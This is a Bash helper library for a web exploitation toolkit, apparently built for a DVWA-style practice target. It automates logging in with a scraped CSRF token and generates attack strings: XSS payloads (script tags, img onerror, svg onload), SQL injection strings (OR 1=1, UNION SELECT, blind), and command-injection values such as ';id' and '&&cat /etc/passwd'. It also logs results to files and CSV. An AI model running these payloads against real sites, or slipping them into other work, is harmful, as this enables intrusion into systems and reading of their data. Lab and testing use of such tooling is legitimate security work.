#!/bin/bash
# lib/exploits_common.sh - Version SANS ERREUR

if [ -z "$GREEN" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    NC='\033[0m'
fi

get_host_ip() {
    hostname -I 2>/dev/null | awk '{print $1}'
}

urlenc() {
    local raw="$1"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$raw" 2>/dev/null
    else
        echo -n "$raw" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g'
    fi
}

check_tools() {
    local missing=0
    for tool in "$@"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${YELLOW}⚠️ $tool manquant${NC}"
            missing=$((missing + 1))
        else
            echo -e "${GREEN}✔ $tool${NC}"
        fi
    done
    [ $missing -eq 0 ] && return 0 || return 1
}

create_cookie_jar() {
    local jar="/tmp/ghost_cookie_$$.txt"
    touch "$jar"
    echo "$jar"
}

cleanup_cookie_jar() {
    rm -f "$1"
}

login_form() {
    local url="$1"
    local username="$2"
    local password="$3"
    local cookie_jar="${4:-$(create_cookie_jar)}"
    
    # Etape 1: GET login page pour obtenir user_token
    local login_page=$(curl -s -c "$cookie_jar" "$url" 2>/dev/null)
    local user_token=$(echo "$login_page" | grep -oP "user_token.*value='\K[^']+")
    
    # Etape 2: POST login avec token
    if [ -n "$user_token" ]; then
        curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
            -d "username=${username}&password=${password}&Login=Login&user_token=${user_token}" \
            "$url" >/dev/null 2>&1
    else
        # Fallback sans token
        curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
            -d "username=${username}&password=${password}&Login=Login" \
            "$url" >/dev/null 2>&1
    fi
    
    local session=$(awk '/PHPSESSID/ {print $7; exit}' "$cookie_jar" 2>/dev/null)
    echo "$cookie_jar|$session"
}

validate_response() {
    local response="$1"
    shift
    for pattern in "$@"; do
        echo "$response" | grep -qiE "$pattern" && return 0
    done
    return 1
}

generate_xss_payload() {
    case "${1:-basic}" in
        basic) cat <<'XSS1'
<script>alert("XSS")</script>
XSS1
        ;;
        img) cat <<'XSS2'
<img src=x onerror=alert("XSS")>
XSS2
        ;;
        svg) cat <<'XSS3'
<svg onload=alert("XSS")>
XSS3
        ;;
        *) cat <<'XSS1'
<script>alert("XSS")</script>
XSS1
        ;;
    esac
}

generate_sqli_payload() {
    case "${1:-basic}" in
        basic) cat <<'SQL1'
' OR '1'='1
SQL1
        ;;
        union) cat <<'SQL2'
' UNION SELECT NULL, NULL, NULL--
SQL2
        ;;
        blind) cat <<'SQL3'
' AND 1=1--
SQL3
        ;;
        *) cat <<'SQL1'
' OR '1'='1
SQL1
        ;;
    esac
}

generate_cmdinj_payload() {
    case "${1:-basic}" in
        semicolon) echo ";id" ;;
        pipe) echo "|whoami" ;;
        and) echo "&&cat /etc/passwd" ;;
        *) echo ";id" ;;
    esac
}

log_exploit() {
    local logfile="$1"
    local level="$2"
    shift 2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*" >> "$logfile"
}

create_csv_header() {
    local file="$1"
    shift
    local IFS=','
    echo "$*" > "$file"
}

append_csv_row() {
    local file="$1"
    shift
    local IFS=','
    echo "$*" >> "$file"
}
